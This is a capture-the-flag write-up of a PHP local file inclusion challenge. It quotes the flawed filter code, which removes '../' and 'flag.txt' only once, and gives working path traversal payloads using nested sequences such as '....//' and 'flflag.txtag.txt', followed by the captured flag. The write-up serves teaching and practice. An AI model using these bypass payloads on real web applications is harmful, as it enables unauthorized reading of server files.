# 『elefay』
> Flag file in /flag.txt

> Link: 10.4.79.68:20005

author: anarchistx

# 『The challenge』

We're given this challenge

<img width="757" height="298" alt="image" src="https://github.com/user-attachments/assets/09431c07-6da4-483b-a017-bead17b27bfe" />

So it should be path traversal. let solve!

# 『Solving challenge』
> Solve by: Lylera_

So this is path traversal - lfi (local file inclusion). if you notice this one

```
if (isset($_GET['file']) && $_GET['file'] !== '') {
  $file = preg_replace('/flag\.txt/i', '', preg_replace('/\.\.\//', '', $_GET['file']));
```

which mean it get some file `flag.txt` by using `?file=` but remember, if you use `../../` it will replace to `''` which is nothing.

So how to face this one? simple. try this command: `?file=/`

<img width="831" height="176" alt="image" src="https://github.com/user-attachments/assets/0c8e1709-930c-4067-a701-8bf9d156eadb" />

it will show up an error of this because it cannot be replace `/`. but you use `../` it will replace.

By this, you know the pattern. Try this `....//`

<img width="799" height="213" alt="image" src="https://github.com/user-attachments/assets/933615e5-dc4d-427d-b557-2d007722b2bb" />

you can double `../` this one and it will replace once, not twice. so this will leave the pattern. next one execute time.

# 『Flag』

try this:
```
?file=/....//....//flflag.txtag.txt
```

<img width="663" height="122" alt="image" src="https://github.com/user-attachments/assets/195ea227-28e6-46d0-bbbf-3430797fcdfc" />


or this one:
```
?file=....//....//....//flflag.txtag.txt
```

<img width="653" height="146" alt="image" src="https://github.com/user-attachments/assets/abe3dfd6-7440-49c1-bbcd-d47b9029ff89" />

```
compit{k4mu_j4g0_b4ng3t_s1h_b4n9_m44f_ya_pr0bs3t_s3d4ng_m4l4s}
```
